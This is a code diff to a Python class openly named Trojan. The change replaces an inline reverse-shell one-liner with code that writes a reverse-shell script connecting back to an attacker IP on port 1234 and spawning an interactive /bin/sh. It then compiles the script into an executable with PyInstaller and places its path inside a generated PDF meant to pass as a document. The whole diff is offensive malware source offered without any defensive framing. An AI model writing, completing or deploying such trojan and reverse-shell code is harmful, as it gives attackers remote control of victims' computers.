@@ -8,10 +8,22 @@ class Trojan:
         self.payload = self.create_payload()
     
     def create_payload(self):
-        # Code to create payload goes here
-        # This payload will create a reverse shell that allows
-        # the attacker to remotely access the victim's computer
-        payload = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.ip}\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"        return payload
+        # Create a Python script that will create a reverse shell
+        with open("payload.py", "w") as f:
+            f.write("import socket,subprocess,os\n")
+            f.write("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
+            f.write(f"s.connect(({self.ip}, 1234))\n")
+            f.write("os.dup2(s.fileno(), 0)\n")
+            f.write("os.dup2(s.fileno(), 1)\n")
+            f.write("os.dup2(s.fileno(), 2)\n")
+            f.write("p = subprocess.call([\"/bin/sh\", \"-i\"])\n")
+
+        # Use PyInstaller to create an executable from the script
+        os.system("pyinstaller payload.py")
+
+        # Return the path to the executable file
+        return "dist/payload"
+
 
     def create_trojan(self):
         # Create a new PDF
@@ -23,7 +35,7 @@ class Trojan:
         # Set the font size
         pdf.set_font('Arial', 'B', 16)
 
-        # Write some text
+        # Write the path to the executable file
         pdf.cell(40, 10, self.payload)
 
         # Save the PDF
